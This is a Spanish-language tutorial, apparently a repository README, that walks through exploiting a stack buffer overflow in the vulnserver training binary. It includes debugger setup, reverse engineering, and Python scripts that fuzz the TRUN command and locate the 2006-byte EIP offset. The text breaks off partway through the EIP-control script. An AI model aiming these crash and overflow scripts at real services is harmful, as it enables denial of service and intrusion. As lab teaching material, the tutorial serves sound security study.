# 🧨 EXPLOTACIÓN EN BINARIOS | STACK-BASED BUFFER OVERFLOW

Este repositorio sirve como explicación y aplicación de metodología y análisis de vulnerabilidades y su explotación en binarios. Como software vulnerable se utiliza el binario **vulnserver**. El objetivo es explotar la vulnerabilidad Stack-based Buffer Overflow. También se abordan algunos conceptos principales teóricos.

--- 
---
---

## 📇 **Índice de contenidos**

* [1. Entorno de trabajo](#step1)
* [2. Configuración del entorno de trabajo](#step2)
  * [2.1 Descarga de vulnserver](#step2-1)
  * [2.2 Descarga de Immunity Debugger](#step2-2)
  * [2.3 Instalación de Immunity Debugger](#step2-3)
  * [2.4 Descarga de Mona](#step2-4)
  * [2.5 Instalación de Mona](#step2-5)
  * [2.6 Descarga de IDA Free](#step2-6)
  * [2.7 Instalación de IDA Free](#step2-7)
  * [2.8 Descarga de Netcat (Nmap)](#step2-8)
  * [2.9 Descarga de Netcat (Nmap)](#step2-9)
* [3. Vulnserver en Immunity Debugger](#step3)
* [4. Vulnserver en IDA Free](#step4)
* [5. Ejecución del binario y conexión al servidor vulnerable](#step5)
* [6. Análisis](#step6)
  * [6.1. Análisis de ejecución](#step6-1)
  * [6.2. Ingeniería inversa](#step6-2)
  	* [6.2.1. Ingeniería inversa en IDA](#step6-2-1)
* [7. Explotación](#step7)
  * [7.1. Fuzzing](#step7-1)
  * [7.1.1 Fuzzing con Immunity Debugger](#step7-1-1)
* [7.2. Descubriendo el offset del registro EIP](#step7-2)
* [7.3. Controlando el registro EIP](#step7-3)
* [7.4. Buscando Bad Characters](#step7-4)
* [7.5. JMP ESP](#step7-5)
	
---
---

<a name="step1"></a>

## 💼 ***1. Entorno de trabajo***

Lista de las principales herramientas utilizadas que sirven como base para realizar el análisis y explotación de vulnerabilidades.

- **Vulnserver**. Es el binario vulnerable. Se trata de un servidor que queda a la espera de recibir conexiones en el puerto 9999 y ofrece una serie de parámetros de entrada tras una conexión exitosa.

- **Immunity Debugger**. Herramienta para depurar y analizar binarios, su código ensamblador, flujo de operación, registros CPU en tiempo real. 

- **Mona**. Es un plugin escrito en Python que se importa en Immunity Debugger para su uso.

- **IDA Free**. Depurador, desensamblador y decompilador. Para la realización de técnicas de ingeniería inversa.

- **Netcat (Nmap)**. Herramienta de línea de comandos para realizar conexiones, leer y escribir datos en la red a través de TCP y UDP.

- **Metasploit Framework**. Para los pasos finales de la explotación.

- **Otros:**
  
	- **Visual Studio Code**
 	- **Git**
    - **Windows SDK**
    - **Java JDK**
    - **Python 3.X y librerías**

---

<a name="step2"></a>

## ⚙️ ***2. Configuración del entorno de trabajo***

A continuación de muestra dónde descargar y cómo instalar y configurar las herramientas.
Se recomienda trabajar en una misma carpeta.

Se puede trabajar tanto en una misma máquina como en varias máquinas virtuales.

---

<a name="step2-1"></a>

### ***2.1. Descarga de vulnserver***

- Visitar la página oficial de vulnserver (https://thegreycorner.com/vulnserver.html).
- Clonar el repositorio de vulnserver.
	- Abrir un CMD en la ruta deseada para la descarga y clonar con Git:
```
git clone https://github.com/stephenbradshaw/vulnserver
```
- El contenido del repositorio incluye el código, librerías y otros archivos entre los que se encuentra el binario ejecutable.

<img width="614" height="237" alt="image" src="https://github.com/user-attachments/assets/e7244b09-c73d-4cf6-b99c-a56a12520999" />

---

<a name="step2-2"></a>

### ***2.2. Descarga de Immunity Debugger***

- ***Actualmente la página oficial de descarga está caída (https://debugger.immunityinc.com/).***
- Se puede descargar en el siguiente repositorio (https://github.com/kbandla/ImmunityDebugger/releases/tag/1.85).
- Click sobre el fichero .exe y se iniciará la descarga.

<img width="413" height="470" alt="image" src="https://github.com/user-attachments/assets/19762637-91b3-4689-9164-6e7add71718d" />

---

<a name="step2-3"></a>

### ***2.3. Instalación de Immunity Debugger***

- Una vez descargado, localizar el ejecutable setup y doble click para comenzar el proceso de instalación.
- Aceptar los términos y condiciones e instalar siguiendo el proceso.
  
<img width="481" height="331" alt="image" src="https://github.com/user-attachments/assets/4457e17c-07ac-474e-bb1c-59bb343cda00" />

- Posteriormente, localizar el ejecutable Immunity Debugger para ejecutar el programa haciendo doble click. Por defecto, en la instalación se genera la carpeta _C:\Program Files (x86)\Immunity Inc\Immunity Debugger_ .

<img width="613" height="516" alt="image" src="https://github.com/user-attachments/assets/8629c3a7-42ce-4b2c-9e54-dfe6a513ef91" />

---

<img width="613" height="516" alt="image" src="https://github.com/user-attachments/assets/22133dec-4197-48ac-9bae-adb13c81c781" />

---

<a name="step2-4"></a>

### ***2.4. Descarga de Mona***

- [La página oficial de Mona](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
- Clonar el repositorio de mona.py .
	- Abrir un CMD en la ruta deseada para la descarga y clonar con Git:
```
git clone https://github.com/corelan/mona.git
```

---

<a name="step2-5"></a>

### ***2.5. Instalación de Mona***

- Una vez descargado el repositorio de Mona, copiar el fichero **mona.py** a la carpeta **PyCommands** de Immunity Debugger como administrador. Por lo general en _C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands_ .

- Abrir Immunity Debugger como administrador y ejecutar el comando '**!mona**' en la barra inferior para comprobar que está bien importado. Se mostrará el manual de ayuda.

<img width="1914" height="1032" alt="image" src="https://github.com/user-attachments/assets/cfcb9822-5c0f-4332-85be-febb04a73d3c" />

Con el comando: 

```!mona config -set workingfolder C:\mona\%p```

todo lo que se vaya generando con Mona se guarda en una carpeta establecida en la ruta que se prefiera. 

<img width="819" height="107" alt="image" src="https://github.com/user-attachments/assets/e6450ece-4ef4-4607-8f53-018066f5fced" />

---

<a name="step2-6"></a>

### ***2.6. Descarga de IDA Free***

- [La página oficial de IDA Free](https://hex-rays.com/pricing?section=individuals).

- Seleccionar el paquete Free y descargar siguiendo las instrucciones.

---

<a name="step2-7"></a>

### ***2.7. Instalación de IDA Free***

- Localizar el archivo setup descargado.
- Doble click para iniciar el proceso de instalación.
- Aceptar los términos y condiciones y dejar las opciones por defecto de instalación.
- _Al instalarlo se instala también Python 2.17 y se recomienda instalar el 3.14 o más actual._

---

<a name="step2-8"></a>

### ***2.8. Descarga de Netcat (Nmap)***

- [La página oficial de Nmap](https://nmap.org/download.html).
- Seleccionar el sistema operativo. Ej: Microsoft Windows binaries.
- Seleccionar la versión más estable disponible 'Latest stable release self-installer'. Ej: _nmap-7.98-setup.exe_ .

---

<a name="step2-9"></a>

### ***2.9. Instalación de Netcat (Nmap)***

- Localizar el archivo setup descargado.
- Doble click para iniciar el proceso de instalación.
- Aceptar los términos y condiciones y dejar las opciones por defecto de instalación.

---

<a name="step3"></a>

## ***3. Vulnserver en Immunity Debugger***

- Una vez abierto Immunity Debugger, en la barra de herramientas superior seleccionar _View -> CPU_ y maximizar.
- A continuación ir a _File -> Open_ y seleccionar el ejecutable de vulnserver.
- De esta manera se ejecuta una instancia del binario y se obtiene la información del binario, código ensamblador, registros, direcciones que utiliza, etc.
- En la esquina inferior derecha se indica el estado de ejecución del binario.

<img width="1918" height="1027" alt="image" src="https://github.com/user-attachments/assets/fcc776d6-0b8f-4a60-931c-5205f66d3081" />

La vista que se obtiene consiste en cuatro ventanas:

Código ensamblador - Registros

Dump de memoria - Stack

---

<a name="step4"></a>

## ***4. Vulnserver en IDA Free***

- Al abrir IDA Free seleccionar si es la primera vez **New Dissasemble a new file**.
  
<img width="392" height="353" alt="image" src="https://github.com/user-attachments/assets/493d7c1a-2b42-4475-9087-dcbbc4b70bf3" />

- Seleccionar el ejecutable de vulnserver.

<img width="674" height="382" alt="image" src="https://github.com/user-attachments/assets/f982595e-8d1f-4fe1-9b5d-ccbb4ff01a65" />

---

<img width="557" height="488" alt="image" src="https://github.com/user-attachments/assets/704c8501-7eea-4c22-bbbd-12469ff249c5" />

- Al cargar el binario se obtiene toda la información de este repartida en ventanas y pestañas. Existen dos ventanas principales:
  
	- En la ventana ‘Functions’ a la izquierda se muestran las funciones que se están utilizando.La ventana de la derecha 		se divide en diferentes pestañas relacionadas que proporcionan los datos sobre la función seleccionada en la ventana 		anterior.
   
 	- La primera pestaña, ‘IDA View-A’, muestra el esquema en árbol del código ensamblador de la función seleccionada del 		binario.


<img width="1297" height="1028" alt="image" src="https://github.com/user-attachments/assets/d2f890c8-5af2-479b-93b0-f76592ee5ee1" />

---

<a name="step5"></a>

## 🖥️ ***5. Ejecución del binario y conexión al servidor vulnerable***

- Al ejecutar el binario (.exe) se abre una terminal en la que el servidor se queda esperando por conexiones.

<img width="803" height="345" alt="image" src="https://github.com/user-attachments/assets/91bb667d-556f-441f-88bc-112b653ba943" />

- El servidor espera por conexiones en el puerto 9999. La conexión puede realizarse de múltiples maneras. A continuación se muestran dos de ellas. En ambos casos se ha utilizado la herramienta Netcat de Nmap.

	**Servidor en máquina local y conexión desde máquina virtual Kali Linux**

	Se puede determinar la IP sobre la que se ejecuta el servidor o utilizar la IP de localhost (127.0.0.1) y se realiza la 	conexión al puerto 9999.

	```
		nc 192.168.1.54 9999.
	```

	<img width="940" height="391" alt="image" src="https://github.com/user-attachments/assets/fb0f0b9b-2f69-40fc-ba34-6a7a9df15303" />

 	**Servidor y conexión en la misma máquina local** 

	<img width="518" height="366" alt="image" src="https://github.com/user-attachments/assets/08f903db-1d84-4446-b362-a7eac54b1061" />

- En cualquier caso, al obtener una conexión exitosa, desde la terminal donde se envía el comando se toma el control del servidor, ofreciendo este una entrada primera para escribir el comando 'HELP'. Mientras tanto, la terminal del servidor muestra los mensajes de las conexiones recibidas.

---

<a name="step6"></a>

## 🔎 ***6. Análisis***

Antes de comenzar con la explotación hay que entender la funcionalidad y estructura del programa que se pretende explotar. Para ello, el análisis de código tanto si se tiene acceso al código fuente como al ensamblador del binario y la ingeniería inversa son pasos esenciales previos a la explotación.

---

<a name="step6-1"></a>

### ***6.1. Análisis de ejecución***

Una de las principales maneras de entender en este caso el binario a explotar es ejecutándolo y comprobar qué se puede hacer con el en una ejecución normal, qué parámetros acepta, qué muestra, etc. Entra dentro de lo que se denomina **análisis dinámico**.

En el caso de nuestro binario vulnserver una vez realizada la conexión con el servidor se muestra un prompt para introducir el comando HELP. Al hacerlo, se muestra una lista de los comandos válidos y cómo utilizarlos. Cada comando debe venir acompañado de una cadena de caracteres.

<img width="455" height="356" alt="image" src="https://github.com/user-attachments/assets/cdabd144-395b-43bc-9be4-e52a25615223" />

---

<a name="step6-2"></a>

### ***6.2. Ingeniería inversa***

- **Análisis de código fuente:** en el caso de disponer del código fuente del progarma, el análisis del mismo puede darnos pistas importantes sobre vulnerabilidades latentes. Esto puede deberse principalmente al uso de funciones inseguras como son en C _strcpy, gets, etc_.
	- _En este ejemplo se trabaja como si se careciera del código fuente._

En el caso de no disponer del código fuente se aplica ingeniería inversa sobre el binario ejecutable. Descomponiendo y analizando el comportamiento interno del softwar. Va de la mano con el análisis de ejecución.

El objetivo es identificar funciones, estructuras, rutas de ejecución y patrones sospechosos. Ejecutar el programa en un entorno controlado y observar su comportamiento en tiempo real utilizando debuggers y depuradores ayuda a comprender cómo se comporta el software ante determinadas entradas, cómo gestiona la memoria y qué validaciones aplica o no aplica.

Un ejemplo claro de lo que sería aplicar estas técnicas de ingeniería inversa es desensamblar o decompilar el binario a través de herramientas como IDA, Ghidra, Immunity Debugger o xDBG, obteniendo de esta manera el código ensamblador e incluso el pseudocódigo.

---

<a name="step6-2-1"></a>

#### ***6.2.1 Ingeniería inversa en IDA Free***

Para obtener y entender el código ensamblador del binario así como el flujo de control del programa se puede emplear la herramienta IDA Free.

- Una vez abierto el programa con el binario cargado, **ir a View -> Open subviews -> Generate pseudocode (F5)**.

<img width="538" height="128" alt="image" src="https://github.com/user-attachments/assets/ed009768-aca5-45fc-ad55-9acd7a449a86" />

- En la ventana de IDA View-A, **clic derecho -> Synchronize with -> Pseudocode-A** . Se obtiene una sincronización entre el código ensamblador y el pseudocódigo generado al seleccionar cualquier línea de código. 

<img width="985" height="674" alt="image" src="https://github.com/user-attachments/assets/f243a022-4cc8-452a-8920-376b64505a07" />

De esta manera se obtiene una imagen más visual de a qué corresponde cada parte del código ensamblador.

<img width="1489" height="686" alt="image" src="https://github.com/user-attachments/assets/def9d2bf-3dcb-4547-82d5-ae17ff0027af" />

---

<a name="step7"></a>

## 💥 ***7. Explotación***

Tras el análisis del binario y entender su funcionamiento y flujo de trabajo, es hora de realizar la explotación. 

---

<a name="step7-1"></a>

### ⌨️ ***7.1. Fuzzing***

Aplicando fuzzing se busca observar cómo reacciona el programa a los diferentes inputs que se le pueden pasar, proporcionando entradas masivas (payloads, como cadenas de caracteres) y aleatorias generalmente con el objetivo de detectar fallos y/o resultados inesperados no previstos.

Aplicar fuzzing en este caso es sencillo puesto que el servidor permite entradas por teclado, pudiendo introducir cualquier cadena de caracteres. Para ello se pueden emplear herramientas de fuzzing o generar scripts directamente.

Se emplea el siguiente script escrito en Python, a través del cual, un bucle establece conexión con el servidor de vulnserver enviando entradas como parámetros del comando válido _TRUN_.

<details>
<summary><b>Python Script Fuzzing</b></summary>
  
```python
import socket
from time import sleep

# Define the target server IP and Port
target_ip = '127.0.0.1'
target_port = 9999

# Fuzzing variables
text = b'A'
buffer = text * 100
buffer_increment = 300

# Command
command = b'TRUN'
command_magic = b' .'

try:
	while True:
		# Create a socket object and connect to the server
		print('Exploit> Connect to target')
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target_ip, target_port))

		# Receive the banner or welcome message from the server
		banner = s.recv(1024).decode('utf-8')
		print(f'Server> {banner}')

		# Fuzzing
		print(f'Exploit> Fuzzing {command} command with {len(buffer)} bytes')
		fuzzing = command + command_magic + buffer
		s.send(fuzzing)

		# Receive the response
		response = s.recv(1024).decode('utf-8')
		print(f'Server> {response}')
		print('--------------------------------------')

		# Increment the buffer size and sleep to avoid overwhelming the server
		buffer += text * buffer_increment
		sleep(2)

except Exception as e:
	# Exception handling
	print(f'An error occurred: {str(e)}')
	print(f'Fuzzing crashed at buffer size: {len(buffer)} bytes')

finally:
	# Close the connection
	s.close()
```

</details>

Estas entradas enviadas constan de una cadena de carácteres con la siguiente estructura: **['comando'] + ['.'] + ['A']** . De esta manera, lo que se está enviando al servidor es el comando 'TRUN' seguido de una cadena de caracteres que comienza con el caracter '.' y el resto son letras A cuyo tamaño va aumentando de manera incremental en cada iteración del bucle.

Por cada envío incremental se abre y cierra la conexión al servidor hasta que se produce una excepción en la ejecución del binario, indicando el tamaño del buffer enviado con el que se ha producido el crash.

---

<a name="step7-1-1"></a>

#### ⌨️ ***7.1.1 Fuzzing con Immunity Debugger***

- Abrir Immunity Debugger y ejecutar vulnserver. Para ello ir a _File -> Open (F3)_ y seleccionar el ejecutable vulnserver.

- Abrir la vista de CPU (View -> CPU) para obtener la información del programa en ensamblador, registros de la CUP y direcciones de memoria.

- Al ejecutar vulnserver desde Immunity Debugger de manera inicial estará en estado 'Paused', se muestra en la esquina inferior derecha. Debe verse así:

<img width="1913" height="1030" alt="image" src="https://github.com/user-attachments/assets/19a91228-cc12-4788-82f7-214fb6a9d3fb" />

Los registros de memoria apuntan a direcciones determinadas y son registros de arquitectura x86, es decir, de 32 bits. 

El registro más importante a tener en cuenta para la explotación es el **registro EIP (Instruction Pointer)**, que indica la dirección de memoria donde se encuentra la siguiente instrucción a ejecutar. Si este registro se controla y se sobreescribe, se puede indicar la instrucción siguiente a ejecutar.

Otros interesantes son el registro EBP (Base Pointer), que almacena la dirección de la parte superior del marco de pila con el que se trabaja actualmente y el registro ESP (Stack Pointer), que apunta al tope actual de la pila (donde se encuentran las variables locales / retorno).

<img width="343" height="295" alt="image" src="https://github.com/user-attachments/assets/1bde4a97-3723-41c2-bde1-1512a6398cbf" />

- Para iniciar la ejecución del servidor y pasar al estado 'Running' hacer clic sobre el icono de play en la barra de herramientas superior.

<img width="394" height="138" alt="image" src="https://github.com/user-attachments/assets/a63f7aae-4c58-4e48-8331-dfc2b5e216d5" />

- Para ejecutar el programa de fuzzing basta con abrir una CMD en la carpeta donde se tiene el fichero Python y ejecutar el comando ``` python nombreProgramaFuzzing.py ``` 

El programa envía entradas en bucle aumentando la longitud de la cadena de caracteres a enviar hasta que vulnserver crashea al enviar una cadena de longitud 2200 bytes.

<img width="546" height="396" alt="image" src="https://github.com/user-attachments/assets/8fdb7a71-e207-4e02-be09-ce6c229f43b0" />

Si nos fijamos en Immunity Debugger el log ya indica que se ha producido una violación de acceso en la dirección 0x41414141 y que el programa ha pasado a estado 'Paused'.

<img width="430" height="359" alt="image" src="https://github.com/user-attachments/assets/f474175f-6580-4f77-b759-d8ff5a8f1012" />

--- 

<img width="893" height="578" alt="image" src="https://github.com/user-attachments/assets/050fd634-8eee-4be1-9a76-9033815b59ce" />

En la ventana de registros de la vista CPU se observa que los registros EIP, EBP han sido sobreescritos con 0x41414141 y ESP apunta al tope de la pila a una dirección que contiene una larga secuencia de "A"s .

En la ventana del dump de memoria se muestran las direcciones de memoria y su contenido en el momento del crash.

### ***¿Qué ha pasado?***

Se ha producido un **buffer overflow**. Al enviar una cadena larga (≈2200 bytes) el programa escribió más datos de los que esperaba en una zona de memoria (el búfer) y sobrescribió datos contiguos del stack, incluidos EBP y EIP. Cuando un búfer en el stack se desborda los bytes extras pueden acabar sobrescribiendo primero variables locales, luego registros como EBP y EIP. Esto ha ocurrido al envío de 2200 bytes.

Al sobrescribir el registro EIP con 0x41414141 la ejecución intentó saltar a la dirección 0x41414141 y se produjo el crash debido a que dejó de seguir el flujo del programa y saltar a la siguiente instrucción. Como 0x41414141 no apunta a memoria válida/ejecutable, se produce una excepción y por ende un crash.

### ***¿Por qué 0x41414141?***

![Confused High Quality GIF](https://github.com/user-attachments/assets/659d0819-efe4-427c-9f96-f3851246e878)

Hay que recordar que se han estado enviando cadenas muy largas con 'A's al hacer fuzzing.

0x41 en hexadecimal corresponde al carácter ASCII 'A'. 0x41414141 son cuatro bytes 41 41 41 41 (es decir "AAAA"). La memoria es direccionable por bytes, pero el debugger agrupa y muestra palabras de 4 bytes porque se está trabajando con una arquitectura x86 de 32 bits. Por esta razón aparece 41414141 en lugar de 41 41 41 41.

Los registros de 32 bits (EAX, EIP, EBP, ESP...) almacenan 4 bytes, así que si se cargan cuatro 'A's en la pila, el registro toma esos bytes, aparecerá 0x41414141.

---

<a name="step7-2"></a>

### 🧾 ***7.2. Descubriendo el offset del registro EIP***

Una vez identificado y analizado el crash del programa el siguiente paso es identificar la longitud de la entrada a enviar a vulnserver para poder sobreescribir el registro EIP y hacerse así con el flujo de control. Es decir cuántas A hay que enviar antes de escribir los 4 bytes que acabarán en el registro EIP y poder controlar la dirección de retorno.

El offset es el número de bytes desde el inicio del búfer (la primera posición donde se copió el input) hasta el lugar donde se sobrescribe el registro EIP (los 4 bytes que controlan la dirección de ejecución).

En este caso se trabaja con la herramienta Mona. Para ver los logs de Mona ir a View -> Log y en la barra de comandos: ```!mona```

Los comandos _findmsp_ , _pattern_offset_ y _pattern_create_ generan y analizan patrones para calcular la cantidad exacta de bytes necesarios para alcanzar y sobrescribir EIP.

**1. Comando _pattern_create_:** crea un patrón cíclico de entrada de tamaño especificado en bytes.

```
!mona pattern_create 3000
```

<img width="1133" height="207" alt="image" src="https://github.com/user-attachments/assets/02fccc63-16af-433e-8415-2e9d50a7dc01" />

Si el comando ha funcionado, y se ha configurado anteriormente que el resultado se guarde en un fichero de la carpeta especificada entonces aparecerá algo como esto:

<img width="789" height="188" alt="image" src="https://github.com/user-attachments/assets/077aae4b-48df-4240-97a5-ffdf60b74f7e" />

Y cuyo contenido será la información generada por el comando junto con el patrón creado en diferentes formatos:

<img width="431" height="650" alt="image" src="https://github.com/user-attachments/assets/a08e6722-926c-44df-8d0a-1aa862495030" />

Al ser un patrón cíclico se puede identificar en qué posición del patrón se sobrescribe el registro EIP para establecer cuanta información hay que enviar hasta sobrescribir la información de retorno.

**2. Exploit y comando _pattern_offset_**:

Con el programa reiniciado y corriendo en Immunity Debugger (en estado 'Running') el siguiente paso es la ejecución del siguiente exploit a través de una CMD.

<details>
<summary><b>Python Script EIP Offset Discovery</b></summary>

```python

import socket

# Define the target server IP and Port
target_ip = '127.0.0.1'
target_port = 9999

# Replace the pattern with the one created from Metasploit or Mona
pattern = (
	b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D'
)

# Command
command = b'TRUN'
command_magic = b' .'

try:
	# Create a socket object and connect to the server
	print('Exploit> Connect to target')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))

	# Receive the banner or welcome message from the server
	banner = s.recv(1024).decode('utf-8')
	print(f'Server> {banner}')

	# Offset discovery
	print(f'Exploit> Sending pattern to discover offset')
	offset_discovery = command + command_magic + pattern
	s.send(offset_discovery)

	# Receive the response
	print('Exploit> The target server is expected to crash. No response will be received.')
	try:
		response = s.recv(1024).decode('utf-8')
		print(f'Server> {response}')
	except Exception as e:
		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
	# Exception handling
	print(f'An error occurred: {str(e)}')

finally:
	# Close the connection
	s.close()

```

</details>

Este exploit en Python se encarga de establecer una conexión TCP con vulnserver para enviar un payload con el patrón generado anteriormente.

Al enviarse un payload de 3000 bytes se producirá de nuevo un crash del programa.

<img width="419" height="590" alt="image" src="https://github.com/user-attachments/assets/6531579e-e540-4dad-903a-3179593ab00d" />

En este caso el programa se queda bloqueado indicando una violación de acceso al ejecutar la instrucción de la dirección a la que apunta el registro EIP, la 396F4338 .

Lo que ha ocurrido es lo mismo de antes con el payload formado por 'A's. En este caso se ha vuelto a producir un desbordamiento del buffer y se ha sobrescrito el registro EIP con 4 bytes procedentes del payload enviado. Al ser estos identificables, 396F4338 no deja de ser el número en hexadecimal de los carácteres ASCII del payload que se han guardado en el registro, es decir, **8Co9**.

<img width="425" height="21" alt="image" src="https://github.com/user-attachments/assets/ea9aa420-a743-4d25-a9a3-a0b95e428143" />

Al ejecutar en Immunity Debugger el comando de Mona _pattern_offset_ con la dirección que marca el registro EIP:

```
!mona pattern_offset 396F4338
```

Obtenemos lo siguiente:

<img width="635" height="206" alt="image" src="https://github.com/user-attachments/assets/9a9e5022-ab02-4752-9a2f-31c39252e478" />

El comando ha encontrado que el patrón 8Co9 está la posición 2006 del patrón cíclico hallado. Esto quiere decir que el offset son 2006 bytes y que se pueden enviar 2006 'A's y después 4 'B's para observar que 2006 es la longitud hasta entrar y sobrescribir el EIP.

**3. Comando _findmsp_:**

De la misma manera que se ha ejecutado el anterior comando de Mona, también es posible hacerlo con _findmsp_ .

```
!mona findmsp
```

Como resultado se obtiene información sobre el offset de los registros y también se genera un fichero con toda la información recopilada con Mona al respecto.

<img width="1084" height="301" alt="image" src="https://github.com/user-attachments/assets/b15e0ed5-636b-43e5-a1d9-bfe9066759f4" />

---

<img width="704" height="826" alt="image" src="https://github.com/user-attachments/assets/de15e88c-7261-41a9-ae16-fe4291c71902" />

---

<a name="step7-3"></a>

### 🛃 ***7.3. Controlando el registro EIP***

Una vez identificado el offset (2006 bytes) se puede modificar la entrada para sobrescribir EIP y confirmar el control de la ejecución.

Por ejemplo, reemplazar el registro EIP por 0x42424242 (que representa 'BBBB' en ASCII) es una forma común de verificar que el registro se ha sobrescrito correctamente.

En este caso se hace uso del siguiente script en Python.

<details>
<summary><b>Python Script Control EIP</b></summary>

```python

import socket

# Define the target server IP and Port
target_ip = '127.0.0.1'
target_port = 9999

# 2006 'A's followed by 'BBBB' to check EIP control
buffer = b'A' * 2006 + b'BBBB'

# Command
command = b'TRUN'
command_magic = b' .'

try:
	# Create a socket object and connect to the server
	print('Exploit> Connect to target')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
